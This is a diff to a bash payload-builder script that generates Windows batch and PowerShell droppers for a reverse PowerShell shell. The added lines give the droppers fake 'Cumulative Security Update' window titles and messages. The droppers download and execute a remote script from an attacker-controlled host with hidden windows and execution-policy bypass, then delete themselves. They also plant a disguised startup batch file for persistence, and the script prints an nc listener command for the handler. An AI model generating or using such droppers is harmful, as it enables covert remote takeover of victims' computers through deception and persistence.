@@ -12035,8 +12035,9 @@ echo "---"
 
 
 ## BUILD DROPPER
+# New update to dropper: add PS terminal title and msg ..
 echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update ID00788\"; Write-Host \"Please Wait, Installing Security Updates ..\" -ForeGroundColor green -BackGroundColor black;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 
 
 ## Build Reverse Powershell Shell
@@ -12190,9 +12191,11 @@ echo "---"
 # echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 echo "@echo off" > $IPATH/output/$Drop.bat
+echo "title Cumulative Security Update ID00788" >> $IPATH/output/$Drop.bat
 echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
 echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
 echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution.
 
 
 ## Build Reverse Powershell Shell
@@ -12378,14 +12381,16 @@ else
    ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.$ext.bat ..${white}";sleep 2
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   ## Persistence script updated to hidde the 'powershell execution command' (better social engineering).
+   ## Persistence script updated to hidde the 'powershell execution command' (better persistence social engineering).
    echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo Searching KB4524147 Indexs For Security Updates .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 fi
@@ -12478,12 +12483,13 @@ if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LHOST: $lhost" > $IPATH/output/delete_persistence.txt
    echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence.txt
-   echo "TO DELETE PERSISTENCE FROM TARGET MACHINE" >> $IPATH/output/delete_persistence.txt
-   echo "EXECUTE THE FOLLOW COMMANDS ON TARGET CMD" >> $IPATH/output/delete_persistence.txt
-   echo "-----------------------------------------" >> $IPATH/output/delete_persistence.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence.txt
+   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence.txt
+   echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence.txt
+   echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence.txt
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence.txt
-   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence.txt
    echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence.txt
+   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence.txt
    zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence.txt" --info > /dev/null 2>&1
 fi
 sh_menu
